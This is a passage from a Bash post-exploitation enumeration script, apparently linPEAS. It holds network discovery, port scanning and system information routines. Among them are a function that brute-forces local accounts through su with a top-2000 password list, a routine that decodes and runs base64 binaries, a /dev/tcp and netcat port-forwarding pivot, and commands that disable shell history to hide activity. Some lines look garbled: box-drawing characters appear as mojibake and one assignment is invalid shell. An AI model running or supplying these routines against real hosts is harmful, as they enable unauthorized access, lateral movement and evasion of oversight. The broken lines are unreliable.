   628	  printf $DG"No\n"$NC
   629	}
   630	
   631	print_title(){
   632	  if [ "$DEBUG" ]; then
   633	    END_T2_TIME=$(date +%s 2>/dev/null)
   634	    if [ "$START_T2_TIME" ]; then
   635	      TOTAL_T2_TIME=$(($END_T2_TIME - $START_T2_TIME))
   636	      printf $DG"This check took $TOTAL_T2_TIME seconds\n"$NC
   637	    fi
   638	
   639	    END_T1_TIME=$(date +%s 2>/dev/null)
   640	    if [ "$START_T1_TIME" ]; then
   641	      TOTAL_T1_TIME=$(($END_T1_TIME - $START_T1_TIME))
   642	      printf $DG"The total section execution took $TOTAL_T1_TIME seconds\n"$NC
   643	      echo ""
   644	    fi
   645	
   646	    START_T1_TIME=$(date +%s 2>/dev/null)
   647	  fi
   648	
   649	  title=$1
   650	  title_len=$(echo $title | wc -c)
   651	  max_title_len=80
   652	  rest_len=$((($max_title_len - $title_len) / 2))
   653	
   654	  printf ${BLUE}
   655	  for i in $(seq 1 $rest_len); do printf " "; done
   656	  printf "M-bM-^UM-^T"
   657	  for i in $(seq 1 $title_len); do printf "M-bM-^UM-^P"; done; printf "M-bM-^UM-^P";
   658	  printf "M-bM-^UM-^W"
   659	
   660	  echo ""
   661	
   662	  for i in $(seq 1 $rest_len); do printf "M-bM-^UM-^P"; done
   663	  printf "M-bM-^UM-# $GREEN${title}${BLUE} M-bM-^UM- "
   664	  for i in $(seq 1 $rest_len); do printf "M-bM-^UM-^P"; done
   665	
   666	  echo ""
   667	
   668	  printf ${BLUE}
   669	  for i in $(seq 1 $rest_len); do printf " "; done
   670	  printf "M-bM-^UM-^Z"
   671	  for i in $(seq 1 $title_len); do printf "M-bM-^UM-^P"; done; printf "M-bM-^UM-^P";
   672	  printf "M-bM-^UM-^]"
   673	  
   674	  printf $NC
   675	  echo ""
   676	}
   677	
   678	print_2title(){
   679	  if [ "$DEBUG" ]; then
   680	    END_T2_TIME=$(date +%s 2>/dev/null)
   681	    if [ "$START_T2_TIME" ]; then
   682	      TOTAL_T2_TIME=$(($END_T2_TIME - $START_T2_TIME))
   683	      printf $DG"This check took $TOTAL_T2_TIME seconds\n"$NC
   684	      echo ""
   685	    fi
   686	
   687	    START_T2_TIME=$(date +%s 2>/dev/null)
   688	  fi
   689	
   690	  printf ${BLUE}"M-bM-^UM-^TM-bM-^UM-^PM-bM-^UM-^PM-bM-^UM-^PM-bM-^UM-^PM-bM-^UM-^PM-bM-^UM-^PM-bM-^UM-^PM-bM-^UM-^PM-bM-^UM-^PM-bM-^UM-^PM-bM-^UM-# $GREEN$1\n"$NC #There are 10 "M-bM-^UM-^P"
   691	}
   692	
   693	print_3title(){
   694	  printf ${BLUE}"M-bM-^UM-^PM-bM-^UM-^PM-bM-^UM-# $GREEN$1\n"$NC #There are 2 "M-bM-^UM-^P"
   695	}
   696	
   697	print_3title_no_nl(){
   698	  printf "\033[2K\r"
   699	  printf ${BLUE}"M-bM-^UM-^PM-bM-^UM-^PM-bM-^UM-# $GREEN${1}..."$NC #There are 2 "M-bM-^UM-^P"
   700	}
   701	
   702	print_list(){
   703	  printf ${BLUE}"M-bM-^UM-^PM-bM-^UM-# $GREEN$1"$NC #There is 1 "M-bM-^UM-^P"
   704	}
   705	
   706	print_info(){
   707	  printf "${BLUE}M-bM-^UM-^Z ${ITALIC_BLUE}$1\n"$NC
   708	}
   709	
   710	print_ps (){
   711	  (ls -d /proc/*/ 2>/dev/null | while read f; do
   712	    CMDLINE=$(cat $f/cmdline 2>/dev/null | grep -av "seds,"); #Delete my own sed processess
   713	    if [ "$CMDLINE" ];
   714	      then var USER2=ls -ld $f | awk '{print $3}'; PID=$(echo $f | cut -d "/" -f3);
   715	      printf "  %-13s  %-8s  %s\n" "$USER2" "$PID" "$CMDLINE";
   716	    fi;
   717	  done) 2>/dev/null | sort -r
   718	}
   719	
   720	su_try_pwd (){
   721	  BFUSER=$1
   722	  PASSWORDTRY=$2
   723	  trysu=$(echo "$PASSWORDTRY" | timeout 1 su $BFUSER -c whoami 2>/dev/null)
   724	  if [ "$trysu" ]; then
   725	    echo "  You can login as $BFUSER using password: $PASSWORDTRY" | sed -${E} "s,.*,${SED_RED_YELLOW},"
   726	  fi
   727	}
   728	
   729	su_brute_user_num (){
   730	  BFUSER=$1
   731	  TRIES=$2
   732	  su_try_pwd "$BFUSER" "" &    #Try without password
   733	  su_try_pwd "$BFUSER" "$BFUSER" & #Try username as password
   734	  su_try_pwd "$BFUSER" "$(echo $BFUSER | rev 2>/dev/null)" & #Try reverse username as password
   735	  if [ "$PASSWORD" ]; then
   736	    su_try_pwd "$BFUSER" "$PASSWORD" & #Try given password
   737	  fi
   738	  for i in $(seq "$TRIES"); do
   739	    su_try_pwd "$BFUSER" "$(echo $top2000pwds | cut -d ' ' -f $i)" & #Try TOP TRIES of passwords (by default 2000)
   740	    sleep 0.007 # To not overload the system
   741	  done
   742	  wait
   743	}
   744	
   745	check_if_su_brute(){
   746	  error=$(echo "" | timeout 1 su $(whoami) -c whoami 2>&1);
   747	  if ! echo $error | grep -q "must be run from a terminal"; then
   748	    echo "1"
   749	  fi
   750	}
   751	
   752	eval_bckgrd(){
   753	  eval "$1" &
   754	  CONT_THREADS=$(($CONT_THREADS+1)); if [ "$(($CONT_THREADS%$THREADS))" -eq "0" ]; then wait; fi
   755	}
   756	
   757	macosNotSigned(){
   758	  for filename in $1/*; do
   759	    if codesign -vv -d \"$filename\" 2>&1 | grep -q 'not signed'; then
   760	      echo "$filename isn't signed" | sed -${E} "s,.*,${SED_RED},"
   761	    fi
   762	  done
   763	}
   764	
   765	execBin(){
   766	  TOOL_NAME=$1
   767	  TOOL_LINK=$2
   768	  B64_BIN=$3
   769	  PARAMS=$4
   770	  if [ "$B64_BIN" ]; then
   771	    echo ""
   772	    print_3title "Running $TOOL_NAME"
   773	    print_info "$TOOL_LINK"
   774	    echo "$B64_BIN" | base64 -d > $Wfolder/bin
   775	    chmod +x $Wfolder/bin
   776	    eval "$Wfolder/bin $PARAMS"
   777	    rm -f $Wfolder/bin
   778	    echo ""
   779	  fi
   780	}
   781	
   782	###########################################
   783	#---------) Internet functions (----------#
   784	###########################################
   785	check_tcp_80(){
   786	  (timeout -s KILL 20 /bin/bash -c '( echo >/dev/tcp/1.1.1.1/80 && echo "Port 80 is accessible" || echo "Port 80 is not accessible") 2>/dev/null | grep "accessible"') 2>/dev/null || echo "Port 80 is not accessible"
   787	}
   788	check_tcp_443(){
   789	  (timeout -s KILL 20 /bin/bash -c '(echo >/dev/tcp/1.1.1.1/443 && echo "Port 443 is accessible" || echo "Port 443 is not accessible") 2>/dev/null | grep "accessible"') 2>/dev/null || echo "Port 443 is not accessible"
   790	}
   791	check_icmp(){
   792	  (timeout -s KILL 20 /bin/bash -c '(ping -c 1 1.1.1.1 | grep "1 received" && echo "Ping is available" || echo "Ping is not available") 2>/dev/null | grep "available"') 2>/dev/null || echo "Ping is not available"
   793	}
   794	#DNS function from: https://unix.stackexchange.com/questions/600194/create-dns-query-with-netcat-or-dev-udp
   795	#I cannot use this function because timeout doesn't find it, so it's copy/pasted below
   796	check_dns(){
   797	  (timeout 20 /bin/bash -c '(( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 <&3 2>/dev/null | xxd ) 3>/dev/udp/1.1.1.1/53 && echo "DNS available" || echo "DNS not available") 2>/dev/null | grep "available"' ) 2>/dev/null || echo "DNS not available"
   798	}
   799	
   800	###########################################
   801	#----------) Network functions (----------#
   802	###########################################
   803	# Adapted from https://github.com/carlospolop/bashReconScan/blob/master/brs.sh
   804	
   805	basic_net_info(){
   806	  print_title "Basic Network Info"
   807	  (ifconfig || ip a) 2>/dev/null
   808	  echo ""
   809	}
   810	
   811	select_nc (){
   812	  #Select the correct configuration of the netcat found
   813	  NC_SCAN="$FOUND_NC -v -n -z -w 1"
   814	  $($NC_SCAN 127.0.0.1 65321 > /dev/null 2>&1)
   815	  if [ $? -eq 2 ]
   816	  then
   817	    NC_SCAN="timeout 1 $FOUND_NC -v -n"
   818	  fi
   819	}
   820	
   821	icmp_recon (){
   822	  #Discover hosts inside a /24 subnetwork using ping (start pingging broadcast addresses)
   823		IP3=$(echo $1 | cut -d "." -f 1,2,3)
   824	
   825	  (timeout 1 ping -b -c 1 "$IP3.255" 2>/dev/null | grep "icmp_seq" | sed -${E} "s,[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+,${SED_RED},") &
   826	  (timeout 1 ping -b -c 1 "255.255.255.255" 2>/dev/null | grep "icmp_seq" | sed -${E} "s,[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+,${SED_RED},") &
   827		for j in $(seq 0 254)
   828		do
   829	    (timeout 1 ping -b -c 1 "$IP3.$j" 2>/dev/null | grep "icmp_seq" | sed -${E} "s,[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+,${SED_RED},") &
   830		done
   831	  wait
   832	}
   833	
   834	tcp_recon (){
   835	  #Discover hosts inside a /24 subnetwork using tcp connection to most used ports and selected ones
   836	  IP3=$(echo $1 | cut -d "." -f 1,2,3)
   837		PORTS=$2
   838	  printf ${YELLOW}"[+]${BLUE} Ports going to be scanned: $PORTS" $NC | tr '\n' " "
   839	  printf "$NC\n"
   840	
   841	  for port in $PORTS; do
   842	    for j in $(seq 1 254)
   843	    do
   844	      if [ "$FOUND_BASH" ] && [ "$TIMEOUT" ]; then
   845	        $TIMEOUT 2.5 $FOUND_BASH -c "(echo </dev/tcp/$IP3.$j/$port) 2>/dev/null && echo -e \"\n[+] Open port at: $IP3.$j:$port\"" &
   846	      elif [ "$NC_SCAN" ]; then
   847	        ($NC_SCAN "$IP3"."$j" "$port" 2>&1 | grep -iv "Connection refused\|No route\|Version\|bytes\| out" | sed -${E} "s,[0-9\.],${SED_RED},g") &
   848	      fi
   849	    done
   850	    wait
   851	  done
   852	}
   853	
   854	tcp_port_scan (){
   855	  #Scan open ports of a host. Default: nmap top 1000, but the user can select others
   856	  basic_net_info
   857	
   858	  print_title "Network Port Scanning"
   859	  IP=$1
   860		PORTS="$2"
   861	
   862	  if [ -z "$PORTS" ]; then
   863	    printf ${YELLOW}"[+]${BLUE} Ports going to be scanned: DEFAULT (nmap top 1000)" $NC | tr '\n' " "
   864	    printf "$NC\n"
   865	    PORTS="1 3 4 6 7 9 13 17 19 20 21 22 23 24 25 26 30 32 33 37 42 43 49 53 70 79 80 81 82 83 84 85 88 89 90 99 100 106 109 110 111 113 119 125 135 139 143 144 146 161 163 179 199 211 212 222 254 255 256 259 264 280 301 306 311 340 366 389 406 407 416 417 425 427 443 444 445 458 464 465 481 497 500 512 513 514 515 524 541 543 544 545 548 554 555 563 587 593 616 617 625 631 636 646 648 666 667 668 683 687 691 700 705 711 714 720 722 726 749 765 777 783 787 800 801 808 843 873 880 888 898 900 901 902 903 911 912 981 987 990 992 993 995 999 1000 1001 1002 1007 1009 1010 1011 1021 1022 1023 1024 1025 1026 1027 1028 1029 1030 1031 1032 1033 1034 1035 1036 1037 1038 1039 1040 1041 1042 1043 1044 1045 1046 1047 1048 1049 1050 1051 1052 1053 1054 1055 1056 1057 1058 1059 1060 1061 1062 1063 1064 1065 1066 1067 1068 1069 1070 1071 1072 1073 1074 1075 1076 1077 1078 1079 1080 1081 1082 1083 1084 1085 1086 1087 1088 1089 1090 1091 1092 1093 1094 1095 1096 1097 1098 1099 1100 1102 1104 1105 1106 1107 1108 1110 1111 1112 1113 1114 1117 1119 1121 1122 1123 1124 1126 1130 1131 1132 1137 1138 1141 1145 1147 1148 1149 1151 1152 1154 1163 1164 1165 1166 1169 1174 1175 1183 1185 1186 1187 1192 1198 1199 1201 1213 1216 1217 1218 1233 1234 1236 1244 1247 1248 1259 1271 1272 1277 1287 1296 1300 1301 1309 1310 1311 1322 1328 1334 1352 1417 1433 1434 1443 1455 1461 1494 1500 1501 1503 1521 1524 1533 1556 1580 1583 1594 1600 1641 1658 1666 1687 1688 1700 1717 1718 1719 1720 1721 1723 1755 1761 1782 1783 1801 1805 1812 1839 1840 1862 1863 1864 1875 1900 1914 1935 1947 1971 1972 1974 1984 1998 1999 2000 2001 2002 2003 2004 2005 2006 2007 2008 2009 2010 2013 2020 2021 2022 2030 2033 2034 2035 2038 2040 2041 2042 2043 2045 2046 2047 2048 2049 2065 2068 2099 2100 2103 2105 2106 2107 2111 2119 2121 2126 2135 2144 2160 2161 2170 2179 2190 2191 2196 2200 2222 2251 2260 2288 2301 2323 2366 2381 2382 2383 2393 2394 2399 2401 2492 2500 2522 2525 2557 2601 2602 2604 2605 2607 2608 2638 2701 2702 2710 2717 2718 2725 2800 2809 2811 2869 2875 2909 2910 2920 2967 2968 2998 3000 3001 3003 3005 3006 3007 3011 3013 3017 3030 3031 3052 3071 3077 3128 3168 3211 3221 3260 3261 3268 3269 3283 3300 3301 3306 3322 3323 3324 3325 3333 3351 3367 3369 3370 3371 3372 3389 3390 3404 3476 3493 3517 3527 3546 3551 3580 3659 3689 3690 3703 3737 3766 3784 3800 3801 3809 3814 3826 3827 3828 3851 3869 3871 3878 3880 3889 3905 3914 3918 3920 3945 3971 3986 3995 3998 4000 4001 4002 4003 4004 4005 4006 4045 4111 4125 4126 4129 4224 4242 4279 4321 4343 4443 4444 4445 4446 4449 4550 4567 4662 4848 4899 4900 4998 5000 5001 5002 5003 5004 5009 5030 5033 5050 5051 5054 5060 5061 5080 5087 5100 5101 5102 5120 5190 5200 5214 5221 5222 5225 5226 5269 5280 5298 5357 5405 5414 5431 5432 5440 5500 5510 5544 5550 5555 5560 5566 5631 5633 5666 5678 5679 5718 5730 5800 5801 5802 5810 5811 5815 5822 5825 5850 5859 5862 5877 5900 5901 5902 5903 5904 5906 5907 5910 5911 5915 5922 5925 5950 5952 5959 5960 5961 5962 5963 5987 5988 5989 5998 5999 6000 6001 6002 6003 6004 6005 6006 6007 6009 6025 6059 6100 6101 6106 6112 6123 6129 6156 6346 6389 6502 6510 6543 6547 6565 6566 6567 6580 6646 6666 6667 6668 6669 6689 6692 6699 6779 6788 6789 6792 6839 6881 6901 6969 7000 7001 7002 7004 7007 7019 7025 7070 7100 7103 7106 7200 7201 7402 7435 7443 7496 7512 7625 7627 7676 7741 7777 7778 7800 7911 7920 7921 7937 7938 7999 8000 8001 8002 8007 8008 8009 8010 8011 8021 8022 8031 8042 8045 8080 8081 8082 8083 8084 8085 8086 8087 8088 8089 8090 8093 8099 8100 8180 8181 8192 8193 8194 8200 8222 8254 8290 8291 8292 8300 8333 8383 8400 8402 8443 8500 8600 8649 8651 8652 8654 8701 8800 8873 8888 8899 8994 9000 9001 9002 9003 9009 9010 9011 9040 9050 9071 9080 9081 9090 9091 9099 9100 9101 9102 9103 9110 9111 9200 9207 9220 9290 9415 9418 9485 9500 9502 9503 9535 9575 9593 9594 9595 9618 9666 9876 9877 9878 9898 9900 9917 9929 9943 9944 9968 9998 9999 10000 10001 10002 10003 10004 10009 10010 10012 10024 10025 10082 10180 10215 10243 10566 10616 10617 10621 10626 10628 10629 10778 11110 11111 11967 12000 12174 12265 12345 13456 13722 13782 13783 14000 14238 14441 14442 15000 15002 15003 15004 15660 15742 16000 16001 16012 16016 16018 16080 16113 16992 16993 17877 17988 18040 18101 18988 19101 19283 19315 19350 19780 19801 19842 20000 20005 20031 20221 20222 20828 21571 22939 23502 24444 24800 25734 25735 26214 27000 27352 27353 27355 27356 27715 28201 30000 30718 30951 31038 31337 32768 32769 32770 32771 32772 32773 32774 32775 32776 32777 32778 32779 32780 32781 32782 32783 32784 32785 33354 33899 34571 34572 34573 35500 38292 40193 40911 41511 42510 44176 44442 44443 44501 45100 48080 49152 49153 49154 49155 49156 49157 49158 49159 49160 49161 49163 49165 49167 49175 49176 49400 49999 50000 50001 50002 50003 50006 50300 50389 50500 50636 50800 51103 51493 52673 52822 52848 52869 54045 54328 55055 55056 55555 55600 56737 56738 57294 57797 58080 60020 60443 61532 61900 62078 63331 64623 64680 65000 65129 65389"
   866	  else
   867	    PORTS="$(echo $PORTS | tr ',' ' ')"
   868	    printf ${YELLOW}"[+]${BLUE} Ports going to be scanned: $PORTS" $NC | tr '\n' " "
   869	    printf "$NC\n"
   870	  fi
   871	
   872	  for port in $PORTS; do
   873	    if [ "$FOUND_BASH" ]; then
   874	      $FOUND_BASH -c "(echo </dev/tcp/$IP/$port) 2>/dev/null && echo -n \"[+] Open port at: $IP:$port\"" &
   875	    elif [ "$NC_SCAN" ]; then
   876	      ($NC_SCAN "$IP" "$port" 2>&1 | grep -iv "Connection refused\|No route\|Version\|bytes\| out" | sed -${E} "s,[0-9\.],${SED_RED},g") &
   877	    fi
   878	  done
   879	  wait
   880	}
   881	
   882	discover_network (){
   883	  #Check if IP and Netmask are correct and the use fping or ping to find hosts
   884	  basic_net_info
   885	
   886	  print_title "Network Discovery"
   887	
   888	  DISCOVERY=$1
   889	  IP=$(echo "$DISCOVERY" | cut -d "/" -f 1)
   890	  NETMASK=$(echo "$DISCOVERY" | cut -d "/" -f 2)
   891	
   892	  if [ -z "$IP" ] || [ -z "$NETMASK" ]; then
   893	    printf $RED"[-] Err: Bad format. Example: 127.0.0.1/24"$NC;
   894	    printf ${BLUE}"$HELP"$NC;
   895	    exit 0
   896	  fi
   897	
   898	  #Using fping if possible
   899	  if [ "$FPING" ]; then
   900	    $FPING -a -q -g "$DISCOVERY" | sed -${E} "s,.*,${SED_RED},"
   901	
   902	  #Loop using ping
   903	  else
   904	    if [ "$NETMASK" -eq "24" ]; then
   905	      printf ${YELLOW}"[+]$GREEN Netmask /24 detected, starting...\n$NC"
   906	      icmp_recon $IP
   907	
   908	    elif [ "$NETMASK" -eq "16" ]; then
   909	      printf ${YELLOW}"[+]$GREEN Netmask /16 detected, starting...\n$NC"
   910	      for i in $(seq 1 254)
   911	      do
   912	        NEWIP=$(echo "$IP" | cut -d "." -f 1,2).$i.1
   913	        icmp_recon "$NEWIP"
   914	      done
   915	    else
   916	      printf $RED"[-] Err: Sorry, only Netmask /24 and /16 supported in ping mode. Netmask detected: $NETMASK"$NC;
   917	      exit 0
   918	    fi
   919	  fi
   920	}
   921	
   922	discovery_port_scan (){
   923	  basic_net_info
   924	
   925	  #Check if IP and Netmask are correct and the use nc to find hosts. By default check ports: 22 80 443 445 3389
   926	  print_title "Internal Network Discovery - Finding hosts and scanning ports"
   927	  DISCOVERY=$1
   928	  MYPORTS=$2
   929	
   930	  IP=$(echo "$DISCOVERY" | cut -d "/" -f 1)
   931	  NETMASK=$(echo "$DISCOVERY" | cut -d "/" -f 2)
   932	  echo "Scanning: $DISCOVERY"
   933	
   934	  if [ -z "$IP" ] || [ -z "$NETMASK" ] || [ "$IP" = "$NETMASK" ]; then
   935	    printf $RED"[-] Err: Bad format. Example: 127.0.0.1/24\n"$NC;
   936	    if [ "$IP" = "$NETMASK" ]; then
   937	      printf $RED"[*] This options is used to find active hosts by scanning ports. If you want to perform a port scan of a host use the options: ${YELLOW}-i <IP> [-p <PORT(s)>]\n\n"$NC;
   938	    fi
   939	    printf ${BLUE}"$HELP"$NC;
   940	    exit 0
   941	  fi
   942	
   943	  PORTS="22 80 443 445 3389 $(echo $MYPORTS | tr ',' ' ')"
   944	  PORTS=$(echo "$PORTS" | tr " " "\n" | sort -u) #Delete repetitions
   945	
   946	  if [ "$NETMASK" -eq "24" ]; then
   947	    printf ${YELLOW}"[+]$GREEN Netmask /24 detected, starting...\n" $NC
   948			tcp_recon "$IP" "$PORTS"
   949	
   950		elif [ "$NETMASK" -eq "16" ]; then
   951	    printf ${YELLOW}"[+]$GREEN Netmask /16 detected, starting...\n" $NC
   952			for i in $(seq 0 255)
   953			do
   954				NEWIP=$(echo "$IP" | cut -d "." -f 1,2).$i.1
   955				tcp_recon "$NEWIP" "$PORTS"
   956			done
   957	  else
   958	      printf $RED"[-] Err: Sorry, only netmask /24 and /16 are supported in port discovery mode. Netmask detected: $NETMASK\n"$NC;
   959	      exit 0
   960		fi
   961	}
   962	
   963	
   964	port_forward (){
   965	  LOCAL_IP=$1
   966	  LOCAL_PORT=$2
   967	  REMOTE_IP=$3
   968	  REMOTE_PORT=$4
   969	
   970	  echo "In your machine execute:"
   971	  echo "cd /tmp; rm backpipe; mknod backpipe p;"
   972	  echo "nc -lvnp $LOCAL_PORT 0<backpipe | nc -lvnp 9009 1>backpipe"
   973	  echo ""
   974	  read -p "Press any key when you have executed those commands" useless_var
   975	
   976	  bash -c "exec 3<>/dev/tcp/$REMOTE_IP/$REMOTE_PORT; exec 4<>/dev/tcp/$LOCAL_IP/9009; cat <&3 >&4 & cat <&4 >&3 &"
   977	  echo "If not error was indicated, your host port $LOCAL_PORT should be forwarded to $REMOTE_IP:$REMOTE_PORT"
   978	}
   979	
   980	
   981	###########################################
   982	#---) Exporting history env variables (---#
   983	###########################################
   984	
   985	unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH
   986	export HISTFILE=/dev/null
   987	export HISTSIZE=0
   988	export HISTFILESIZE=0
   989	
   990	
   991	
   992	###########################################
   993	#-----------) Some Basic Info (-----------#
   994	###########################################
   995	
   996	print_title "Basic information"
   997	printf $LG"OS: "$NC
   998	(cat /proc/version || uname -a ) 2>/dev/null | sed -${E} "s,$kernelDCW_Ubuntu_Precise_1,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Precise_2,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Precise_3,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Precise_4,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Precise_5,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Precise_6,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Trusty_1,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Trusty_2,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Trusty_3,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Trusty_4,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Xenial,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Rhel5_1,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Rhel5_2,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Rhel5_3,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Rhel6_1,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Rhel6_2,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Rhel6_3,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Rhel6_4,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Rhel7,${SED_RED_YELLOW}," | sed -${E} "s,$kernelB,${SED_RED},"
   999	printf $LG"User & Groups: "$NC
  1000	(id || (whoami && groups)) 2>/dev/null | sed -${E} "s,$groupsB,${SED_RED},g" | sed -${E} "s,$groupsVB,${SED_RED_YELLOW},g" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN},g" | sed -${E} "s,$nosh_usrs,${SED_BLUE},g" | sed -${E} "s,$knw_usrs,${SED_GREEN},g" | sed -${E} "s,$knw_grps,${SED_GREEN},g" | sed "s,$USER,${SED_LIGHT_MAGENTA},g" | sed -${E} "s,$idB,${SED_RED},g"
  1001	printf $LG"Hostname: "$NC
  1002	hostname 2>/dev/null
  1003	printf $LG"Writable folder: "$NC;
  1004	echo $Wfolder
  1005	
  1006	if ! [ "$FAST" ] && ! [ "$AUTO_NETWORK_SCAN" ]; then
  1007	  printf $LG"Remember that you can use the '-t' option to call the Internet connectivity checks and automatic network recon!\n"$NC;
  1008	fi
  1009	
  1010	if [ "$DISCOVER_BAN_GOOD" ]; then
  1011	  printf $YELLOW"[+] $DISCOVER_BAN_GOOD\n$NC"
  1012	else
  1013	  printf $RED"[-] $DISCOVER_BAN_BAD\n$NC"
  1014	fi
  1015	
  1016	if [ "$SCAN_BAN_GOOD" ]; then
  1017	  printf "$SCAN_BAN_GOOD\n$NC"
  1018	else
  1019	  printf $RED"[-] $SCAN_BAN_BAD\n$NC"
  1020	fi
  1021	if [ "$(command -v nmap 2>/dev/null)" ];then
  1022	  NMAP_GOOD=$GREEN"nmap${BLUE} is available for network discovery & port scanning, you should use it yourself"
  1023	  printf $YELLOW"[+] $NMAP_GOOD\n$NC"
  1024	fi
  1025	echo ""
  1026	echo ""
  1027	
  1028	###########################################
  1029	#--------) Check if network jobs (--------#
  1030	###########################################
  1031	if [ "$PORTS" ]; then
  1032	  if [ "$SCAN_BAN_GOOD" ]; then
  1033	    if [ "$(echo -n $PORTS | sed 's,[0-9, ],,g')" ]; then
  1034	      printf $RED"[-] Err: Symbols detected in the port, for discovering purposes select only 1 port\n"$NC;
  1035	      printf ${BLUE}"$HELP"$NC;
  1036	      exit 0
  1037	    else
  1038	      #Select the correct configuration of the netcat found
  1039	      select_nc
  1040	    fi
  1041	  else
  1042	    printf $RED"  Err: Port scan not possible, any netcat in PATH\n"$NC;
  1043	    printf ${BLUE}"$HELP"$NC;
  1044	    exit 0
  1045	  fi
  1046	fi
  1047	
  1048	if [ "$DISCOVERY" ]; then
  1049	  if [ "$PORTS" ]; then
  1050	    discovery_port_scan $DISCOVERY $PORTS
  1051	  else
  1052	    if [ "$DISCOVER_BAN_GOOD" ]; then
  1053	      discover_network $DISCOVERY
  1054	    else
  1055	      printf $RED"  Err: Discovery not possible, no fping or ping in PATH\n"$NC;
  1056	    fi
  1057	  fi
  1058	  exit 0
  1059	
  1060	elif [ "$IP" ]; then
  1061	  select_nc
  1062	  tcp_port_scan $IP "$PORTS"
  1063	  exit 0
  1064	fi
  1065	
  1066	if [ "$PORT_FORWARD" ]; then
  1067	  if ! [ "$FOUND_BASH" ]; then
  1068	    printf $RED"[-] Err: Port forwarding not possible, no bash in PATH\n"$NC;
  1069	    exit 0
  1070	  fi
  1071	
  1072	  LOCAL_IP="$(echo -n $PORT_FORWARD | cut -d ':' -f 1)"
  1073	  LOCAL_PORT="$(echo -n $PORT_FORWARD | cut -d ':' -f 2)"
  1074	  REMOTE_IP="$(echo -n $PORT_FORWARD | cut -d ':' -f 3)"
  1075	  REMOTE_PORT="$(echo -n $PORT_FORWARD | cut -d ':' -f 4)"
  1076	
  1077	  if ! [ "$LOCAL_IP" ] || ! [ "$LOCAL_PORT" ] || ! [ "$REMOTE_IP" ] || ! [ "$REMOTE_PORT" ]; then
  1078	    printf $RED"[-] Err: Invalid port forwarding configuration: $PORT_FORWARD. The format is: LOCAL_IP:LOCAL_PORT:REMOTE_IP:REMOTE_PORT\nFor example: 10.10.14.8:7777:127.0.0.1:8000"$NC;
  1079	    exit 0
  1080	  fi
  1081	
  1082	  #Check if LOCAL_PORT is a number
  1083	  if ! [ "$(echo $LOCAL_PORT | grep -E '^[0-9]+$')" ]; then
  1084	    printf $RED"[-] Err: Invalid port forwarding configuration: $PORT_FORWARD. The format is: LOCAL_IP:LOCAL_PORT:REMOTE_IP:REMOTE_PORT\nFor example: 10.10.14.8:7777:127.0.0.1:8000"$NC;
  1085	  fi
  1086	
  1087	  #Check if REMOTE_PORT is a number
  1088	  if ! [ "$(echo $REMOTE_PORT | grep -E '^[0-9]+$')" ]; then
  1089	    printf $RED"[-] Err: Invalid port forwarding configuration: $PORT_FORWARD. The format is: LOCAL_IP:LOCAL_PORT:REMOTE_IP:REMOTE_PORT\nFor example: 10.10.14.8:7777:127.0.0.1:8000"$NC;
  1090	  fi
  1091	
  1092	  port_forward "$LOCAL_IP" "$LOCAL_PORT" "$REMOTE_IP" "$REMOTE_PORT"
  1093	  exit 0
  1094	fi
  1095	
  1096	
  1097	#Get HOMESEARCH
  1098	if [ "$SEARCH_IN_FOLDER" ]; then
  1099	  HOMESEARCH="${ROOT_FOLDER}home/ ${ROOT_FOLDER}Users/ ${ROOT_FOLDER}root/ ${ROOT_FOLDER}var/www/"
  1100	else
  1101	  HOMESEARCH="/home/ /Users/ /root/ /var/www $(cat /etc/passwd 2>/dev/null | grep "sh$" | cut -d ":" -f 6 | grep -Ev "^/root|^/home|^/Users|^/var/www" | tr "\n" " ")"
  1102	  if ! echo "$HOMESEARCH" | grep -q "$HOME" && ! echo "$HOMESEARCH" | grep -qE "^/root|^/home|^/Users|^/var/www"; then #If not listed and not in /home, /Users/, /root, or /var/www add current home folder
  1103	    HOMESEARCH="$HOME $HOMESEARCH"
  1104	  fi
  1105	fi
  1106	GREPHOMESEARCH=$(echo "$HOMESEARCH" | sed 's/ *$//g' | tr " " "|") #Remove ending spaces before putting "|"
  1107	
  1108	
  1109	
  1110	
  1111	###########################################
  1112	#----------) Caching Finds (--------------#
  1113	###########################################
  1114	if [ "$SEARCH_IN_FOLDER" ]; then
  1115	  printf $GREEN"Caching directories "$NC
  1116	
  1117	  CONT_THREADS=0
  1118	  # FIND ALL KNOWN INTERESTING SOFTWARE FILES
